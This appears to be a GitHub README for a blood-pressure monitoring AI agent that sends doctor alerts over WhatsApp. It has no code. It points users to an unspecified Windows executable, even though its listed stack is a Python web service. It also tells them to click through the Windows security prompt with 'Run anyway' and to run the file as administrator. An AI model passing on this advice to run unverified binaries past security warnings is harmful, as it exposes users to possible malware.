# 🩺 john-bp-agent - Track vitals and alert doctors

[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/teamadahwei/john-bp-agent/releases)

## 📌 What this app does

john-bp-agent is a healthcare AI agent that watches patient vitals and sends alerts to doctors through WhatsApp. It uses Groq AI to help review the data and decide when a reading needs attention.

Use it to:
- Monitor blood pressure and other vitals
- Spot readings that need review
- Send alerts to doctors on WhatsApp
- Keep a simple record of patient status

## 💻 What you need

Before you start, make sure you have:

- A Windows PC
- Internet access
- A web browser
- Permission to download and run files
- A WhatsApp number for alerts
- A Groq account or API key
- A Twilio account or WhatsApp setup
- A PostgreSQL database if the app asks for one

## 🚀 Download the app

Visit this page to download the latest version:

[Download john-bp-agent from GitHub Releases](https://github.com/teamadahwei/john-bp-agent/releases)

On the Releases page:
1. Open the latest release
2. Find the Windows download file
3. Download the file to your PC
4. Save it in a folder you can find again

## 🪟 Install on Windows

After the file downloads:

1. Open File Explorer
2. Go to your Downloads folder
3. Find the app file
4. If the file is a ZIP folder, right-click it and choose Extract All
5. Open the extracted folder
6. Look for the app file, such as an `.exe` file
7. Double-click the file to run it

If Windows shows a security prompt:
1. Click More info
2. Click Run anyway

## ⚙️ First-time setup

The app may ask for setup details before it runs. Have these ready:

- Groq API key
- Twilio account details
- WhatsApp sender number
- Doctor phone number
- Database connection info

If the app uses a setup file, open it and fill in the values it asks for. Use the same details from your service accounts.

## 🔧 Basic configuration

You may need to add or edit a simple config file. Common settings include:

- Patient name
- Patient ID
- Alert phone number
- WhatsApp message settings
- API keys
- Database address
- Port number for the local app

If you see a `.env` file or a settings screen, enter the values there. Keep each value in the correct field.

## 📋 How to use it

Once the app is running:

1. Open the app on your Windows PC
2. Add or load patient vital data
3. Let the AI review the readings
4. Wait for alerts if the app finds a problem
5. Check WhatsApp for doctor notifications
6. Review the patient status in the app

## 🧠 How the alerts work

The app looks at patient vitals and compares them to safe ranges. If a reading looks off, the agent can send a message to a doctor through WhatsApp.

It is built to help with:
- Blood pressure checks
- Basic patient monitoring
- Quick alert routing
- Simple health review workflows

## 🔍 Common use cases

- A nurse adds a blood pressure reading
- The AI checks if the reading looks normal
- The app sends a WhatsApp alert if the value is too high or too low
- A doctor gets notified and can review the case
- The patient record stays in the system for later review

## 🛠 Troubleshooting

If the app does not start:

- Check that the download finished
- Make sure you extracted the ZIP file
- Run the app again as the same user
- Restart your PC and try again

If WhatsApp alerts do not send:

- Check your Twilio details
- Confirm the WhatsApp number is correct
- Make sure your API key is active
- Check your internet connection

If the app cannot connect to the database:

- Check the database address
- Make sure PostgreSQL is running
- Confirm the username and password
- Try reconnecting after a fresh start

If the app shows an access error:

- Right-click the app file
- Choose Run as administrator
- Try again

## 📁 Typical file layout

You may see files like these after download:

- App file for Windows
- Config file
- Log file
- Readme file
- Database setup file
- Sample patient data

## 🔐 Data and access

This app may handle patient data, so keep access limited to trusted users. Store API keys in a safe place. Do not share your WhatsApp or database details with people who do not need them.

## 🧩 Useful tools linked to this app

This project uses common tools for app and AI workflows:

- FastAPI for the app service
- Groq for AI review
- LangChain for agent flow
- PostgreSQL for data storage
- Twilio for WhatsApp alerts
- Python for app logic
- Render for deployment support

## 🖥 Recommended Windows setup

For smooth use, keep these in place:

- Windows 10 or later
- At least 8 GB RAM
- Free disk space for app files and logs
- Stable internet
- Permission to use WhatsApp and API services

## 📥 Setup checklist

Use this list before you run the app:

- Download the latest release
- Extract the files if needed
- Open the app
- Enter your Groq API key
- Enter your Twilio details
- Add your doctor WhatsApp number
- Set up PostgreSQL if needed
- Test one sample patient record
- Check that alerts reach WhatsApp

## 📲 What to expect after launch

When the app starts, you may see:

- A home screen
- A place to add patient data
- A vitals view
- An alert status area
- A settings page
- A log of recent actions

## 🧭 Where to get updates

To get new versions, return to the release page and download the latest file again:

[Go to john-bp-agent Releases](https://github.com/teamadahwei/john-bp-agent/releases)

## 🩺 Clinical workflow fit

john-bp-agent can fit into a basic care workflow where staff need fast review of patient vitals and a clean alert path to doctors. It helps reduce delay between a reading and a response

## 📄 Project details

- Repository: john-bp-agent
- Type: Healthcare AI agent
- Platform: Windows
- Alert channel: WhatsApp
- AI layer: Groq AI
- Data layer: PostgreSQL